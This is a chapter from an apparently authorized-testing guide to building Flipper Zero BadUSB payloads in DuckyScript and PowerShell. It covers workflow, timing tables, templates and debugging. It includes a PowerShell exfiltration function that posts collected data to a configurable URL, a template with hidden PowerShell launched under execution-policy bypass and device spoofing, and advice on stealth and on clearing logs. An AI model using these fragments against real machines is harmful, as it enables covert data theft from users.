# Development & Creation

## Overview

This section covers payload development best practices, environment setup, and the complete workflow for creating professional-grade BadUSB payloads for authorized security testing.

---

## Development Environment Setup

### Essential Tools

```
1. Text Editor with Syntax Highlighting
   ├── VSCode with DuckyScript extension
   ├── Notepad++ with UDL for DuckyScript
   ├── Sublime Text
   └── Vim/Neovim with custom syntax

2. Testing Environment
   ├── Virtual machines (Windows, macOS, Linux)
   ├── Isolated network segment (no internet)
   ├── USB keyboard tester utilities
   ├── Snapshot capability for quick rollback
   └── Screen recording for documentation

3. Version Control
   ├── Git repository for payloads
   ├── Changelog for each payload version
   ├── Branch strategy (dev/staging/production)
   ├── Code review process
   └── Signed commits for attribution

4. Documentation Tools
   ├── Markdown editor
   ├── Diagram tools (draw.io, Mermaid)
   ├── Screenshot/recording software
   └── Template library
```

### Recommended Project Structure

```
PayloadProject/
├── README.md
├── payloads/
│   ├── basic/
│   │   ├── FZ-B01_System_Info/
│   │   │   ├── payload.txt
│   │   │   ├── README.md
│   │   │   └── CHANGELOG.md
│   │   └── ...
│   ├── intermediate/
│   ├── advanced/
│   └── expert/
├── modules/
│   ├── recon/
│   ├── exfil/
│   ├── persist/
│   └── cleanup/
├── templates/
│   ├── payload_template.txt
│   └── readme_template.md
├── tests/
│   └── test_results.md
└── docs/
    ├── timing_guide.md
    ├── os_differences.md
    └── troubleshooting.md
```

---

## Payload Testing Workflow

### Complete Development Lifecycle

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PAYLOAD DEVELOPMENT LIFECYCLE                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. DESIGN                                                          │
│  ├── Define clear objectives                                        │
│  ├── Identify target OS and version                                 │
│  ├── Plan execution flow (flowchart)                                │
│  ├── Identify dependencies                                          │
│  └── Document scope and limitations                                 │
│                                                                      │
│  2. DEVELOP                                                         │
│  ├── Write initial payload                                          │
│  ├── Add comprehensive comments                                     │
│  ├── Include timing considerations                                  │
│  ├── Add error handling                                             │
│  └── Create modular functions                                       │
│                                                                      │
│  3. TEST (VM)                                                       │
│  ├── Take VM snapshot                                               │
│  ├── Test in virtual environment                                    │
│  ├── Record execution (screen capture)                              │
│  ├── Adjust delays based on results                                 │
│  ├── Verify expected output                                         │
│  └── Test edge cases                                                │
│                                                                      │
│  4. REFINE                                                          │
│  ├── Add robust error handling                                      │
│  ├── Optimize timing (minimize delays)                              │
│  ├── Add anti-detection measures (if needed)                        │
│  ├── Improve stealth (minimize visible activity)                    │
│  └── Reduce payload size                                            │
│                                                                      │
│  5. DOCUMENT                                                        │
│  ├── Purpose and scope                                              │
│  ├── Required conditions                                            │
│  ├── Expected output                                                │
│  ├── Known limitations                                              │
│  ├── Detection indicators                                           │
│  └── Blue team countermeasures                                      │
│                                                                      │
│  6. DEPLOY (Authorized Only)                                        │
│  ├── Final validation on target-like system                         │
│  ├── Engagement approval documentation                              │
│  ├── Execution logging and timestamps                               │
│  ├── Evidence collection                                            │
│  └── Post-execution verification                                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Pre-Deployment Checklist

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PRE-DEPLOYMENT CHECKLIST                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  AUTHORIZATION:                                                      │
│  □ Written authorization obtained                                    │
│  □ Scope clearly defined                                            │
│  □ Emergency contacts documented                                     │
│  □ Legal review completed (if required)                             │
│                                                                      │
│  TECHNICAL:                                                          │
│  □ Payload tested in lab environment                                │
│  □ Target OS verified and matched                                   │
│  □ All timing delays validated                                      │
│  □ Error handling tested                                            │
│  □ Cleanup procedures verified                                      │
│                                                                      │
│  OPERATIONAL:                                                        │
│  □ Flipper Zero charged                                             │
│  □ Payload loaded and verified                                      │
│  □ Backup copy available                                            │
│  □ Extraction plan prepared                                         │
│  □ Evidence handling plan in place                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Payload Development Best Practices

### Timing Optimization

```
WRONG: Arbitrary delays without testing
┌─────────────────────────────────────────────────────────────────────┐
│ DELAY 5000    REM Arbitrary long delay - wastes time                │
│ DELAY 5000    REM Another guess                                     │
│ DELAY 5000    REM No testing was done                               │
└─────────────────────────────────────────────────────────────────────┘

RIGHT: Measured and optimized delays
┌─────────────────────────────────────────────────────────────────────┐
│ DELAY 2000    REM USB enumeration (measured on Windows 11)          │
│ DELAY 500     REM Run dialog response (tested)                      │
│ DELAY 1000    REM Application launch (verified on target HW)        │
└─────────────────────────────────────────────────────────────────────┘

TIMING REFERENCE TABLE:
┌──────────────────────────────┬─────────┬─────────┬─────────┐
│ Action                       │ Min     │ Optimal │ Max     │
├──────────────────────────────┼─────────┼─────────┼─────────┤
│ USB Connect/Enumerate        │ 1000ms  │ 2000ms  │ 3000ms  │
│ GUI r (Run Dialog)           │ 200ms   │ 500ms   │ 1000ms  │
│ Application Launch           │ 500ms   │ 1000ms  │ 2000ms  │
│ PowerShell Window Ready      │ 1000ms  │ 1500ms  │ 2500ms  │
│ Between Commands             │ 100ms   │ 200ms   │ 500ms   │
│ Window Close/Cleanup         │ 500ms   │ 1000ms  │ 2000ms  │
│ File Write Operation         │ 200ms   │ 500ms   │ 1000ms  │
│ Network Request              │ 1000ms  │ 2000ms  │ 5000ms  │
└──────────────────────────────┴─────────┴─────────┴─────────┘
```

### Error Handling

```
BASIC - No error handling (bad)
┌─────────────────────────────────────────────────────────────────────┐
│ STRING powershell                                                    │
│ ENTER                                                                │
│ REM If PowerShell blocked, entire payload fails                     │
└─────────────────────────────────────────────────────────────────────┘

BETTER - Silent errors
┌─────────────────────────────────────────────────────────────────────┐
│ STRING powershell -w hidden 2>$null                                 │
│ ENTER                                                                │
│ REM Errors suppressed, but no fallback                              │
└─────────────────────────────────────────────────────────────────────┘

BEST - Error handling with fallback
┌─────────────────────────────────────────────────────────────────────┐
│ STRINGLN try {                                                       │
│ STRINGLN   $result = Get-Content file.txt                           │
│ STRINGLN } catch {                                                   │
│ STRINGLN   $result = "Error: File not found"                        │
│ STRINGLN }                                                           │
│ REM Graceful degradation with informative output                    │
└─────────────────────────────────────────────────────────────────────┘

POWERSHELL ERROR HANDLING PATTERNS:
┌─────────────────────────────────────────────────────────────────────┐
│ # Suppress all errors                                                │
│ $ErrorActionPreference = "SilentlyContinue"                         │
│                                                                      │
│ # Try-catch for specific handling                                    │
│ try { risky-command } catch { fallback-action }                     │
│                                                                      │
│ # Test before execute                                                │
│ if (Test-Path $file) { Get-Content $file }                          │
│                                                                      │
│ # Null coalescing (PowerShell 7+)                                   │
│ $value = $risky ?? "default"                                        │
└─────────────────────────────────────────────────────────────────────┘
```

### Modular Design

```
REM Create reusable functions for common operations

REM System Information Module
STRINGLN function Get-SysInfo {
STRINGLN   @{
STRINGLN     Host = $env:COMPUTERNAME
STRINGLN     User = $env:USERNAME
STRINGLN     Domain = $env:USERDOMAIN
STRINGLN     OS = (Get-CimInstance Win32_OperatingSystem).Caption
STRINGLN   }
STRINGLN }

REM Data Persistence Module
STRINGLN function Save-Data {
STRINGLN   param($data, $file)
STRINGLN   $data | ConvertTo-Json -Depth 5 | Out-File $file -Force
STRINGLN }

REM Exfiltration Module
STRINGLN function Send-Data {
STRINGLN   param($data, $url)
STRINGLN   try {
STRINGLN     Invoke-RestMethod -Uri $url -Method Post -Body $data
STRINGLN   } catch { Write-Host "Exfil failed" }
STRINGLN }

REM Use modules in payload
STRINGLN $info = Get-SysInfo
STRINGLN Save-Data -data $info -file "$env:TEMP\output.json"
```

### Module Library Structure

```
modules/
├── recon/
│   ├── Get-SysInfo.ps1
│   ├── Get-NetworkInfo.ps1
│   ├── Get-UserInfo.ps1
│   └── Get-SoftwareInventory.ps1
├── exfil/
│   ├── Send-HTTP.ps1
│   ├── Send-DNS.ps1
│   └── Send-Base64.ps1
├── persist/
│   ├── Add-RegistryKey.ps1
│   ├── Add-ScheduledTask.ps1
│   └── Add-WMISubscription.ps1
├── cleanup/
│   ├── Clear-History.ps1
│   ├── Clear-Logs.ps1
│   └── Remove-Artifacts.ps1
└── common/
    ├── Test-Admin.ps1
    ├── Test-Internet.ps1
    └── Get-Timestamp.ps1
```

---

## Payload Template

### Standard Payload Structure

```
REM =====================================================
REM Payload: [PAYLOAD NAME]
REM ID: [FZ-X##]
REM Version: 1.0
REM Author: [Author Name]
REM Platform: [Windows 10/11 | macOS | Linux]
REM Category: [Recon | Exfil | Persist | Attack]
REM =====================================================
REM Purpose: [Brief description of what this payload does]
REM =====================================================
REM Requirements:
REM   - [Requirement 1]
REM   - [Requirement 2]
REM =====================================================
REM MITRE ATT&CK: [Technique ID - Name]
REM =====================================================
REM Legal: For authorized security testing only
REM =====================================================

REM === CONFIGURATION ===
REM Modify these values for your environment
REM EXFIL_URL = "https://your-server.com/collect"

REM === USB DEVICE SPOOFING (Optional) ===
ID 1234:5678 Manufacturer:Product

REM === INITIALIZATION ===
DELAY 2000
REM USB enumeration delay

REM === OPEN EXECUTION ENVIRONMENT ===
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM === MAIN PAYLOAD ===
REM [Payload commands here]

REM === CLEANUP ===
REM [Cleanup commands here]

REM === EXIT ===
STRINGLN exit
REM =====================================================
REM END OF PAYLOAD
REM =====================================================
```

---

## Testing Best Practices

### Virtual Machine Setup

```
┌─────────────────────────────────────────────────────────────────────┐
│                    VM TESTING ENVIRONMENT                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  RECOMMENDED VMs:                                                    │
│  ├── Windows 10 (1909, 21H2, 22H2)                                  │
│  ├── Windows 11 (22H2, 23H2)                                        │
│  ├── macOS (Ventura, Sonoma)                                        │
│  └── Ubuntu/Kali Linux (Latest LTS)                                 │
│                                                                      │
│  CONFIGURATION:                                                      │
│  ├── USB passthrough enabled                                        │
│  ├── Snapshots before each test                                     │
│  ├── Default security settings (realistic)                          │
│  ├── Network isolated or NAT only                                   │
│  └── Logging enabled (for debugging)                                │
│                                                                      │
│  TESTING PROCEDURE:                                                  │
│  1. Restore clean snapshot                                          │
│  2. Start screen recording                                          │
│  3. Connect Flipper Zero                                            │
│  4. Execute payload                                                  │
│  5. Document results                                                 │
│  6. Analyze any failures                                            │
│  7. Restore snapshot                                                 │
│  8. Iterate as needed                                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Debugging Techniques

```
REM Debug Mode - Visible execution for testing
STRING powershell
REM Remove -w hidden for visibility
ENTER

REM Add pause points
STRINGLN Write-Host "Checkpoint 1: PowerShell opened"
STRINGLN Read-Host "Press Enter to continue"

REM Verbose output
STRINGLN $VerbosePreference = "Continue"

REM Log to file
STRINGLN Start-Transcript -Path "$env:TEMP\debug.log"
REM ... payload commands ...
STRINGLN Stop-Transcript
```

---

## Documentation Standards

### README Template

```markdown
# Payload Name

## Overview
Brief description of the payload's purpose and capabilities.

## Metadata
| Property | Value |
|----------|-------|
| ID | FZ-X## |
| Category | Recon/Exfil/Persist |
| Platform | Windows 10/11 |
| Privilege | User/Admin |
| Stealth | Low/Medium/High |

## Description
Detailed explanation of what the payload does and why.

## Requirements
- Requirement 1
- Requirement 2

## Execution Flow
1. Step 1
2. Step 2
3. Step 3

## Configuration
Explain any configurable parameters.

## Expected Output
Describe what success looks like.

## MITRE ATT&CK Mapping
- T#### - Technique Name

## Detection Indicators
- IOC 1
- IOC 2

## Blue Team Countermeasures
How to detect/prevent this attack.

## Changelog
| Version | Date | Changes |
|---------|------|---------|
| 1.0 | YYYY-MM-DD | Initial release |
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────────────┐
│                DEVELOPMENT QUICK REFERENCE                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  WORKFLOW:                                                          │
│  Design → Develop → Test (VM) → Refine → Document → Deploy          │
│                                                                      │
│  TIMING GUIDELINES:                                                  │
│  ├── USB enum: 2000ms                                               │
│  ├── GUI r: 500ms                                                   │
│  ├── PowerShell: 1500ms                                             │
│  └── Between cmds: 200ms                                            │
│                                                                      │
│  ERROR HANDLING:                                                     │
│  ├── Use try/catch blocks                                           │
│  ├── Test paths before access                                       │
│  └── Provide fallback values                                        │
│                                                                      │
│  BEST PRACTICES:                                                     │
│  ├── Test in VM first                                               │
│  ├── Use modular functions                                          │
│  ├── Add comprehensive comments                                      │
│  ├── Document everything                                            │
│  └── Include cleanup                                                │
│                                                                      │
│  AUTHORIZATION REQUIRED:                                             │
│  ├── Written permission                                              │
│  ├── Scope definition                                               │
│  ├── Emergency contacts                                              │
│  └── Legal review                                                   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

[← Deployment Strategies](../06_Deployment_Strategies/) | [Back to Flipper Zero](../README.md) | [Next: Red Team Tactics →](../08_Red_Team_Tactics/)
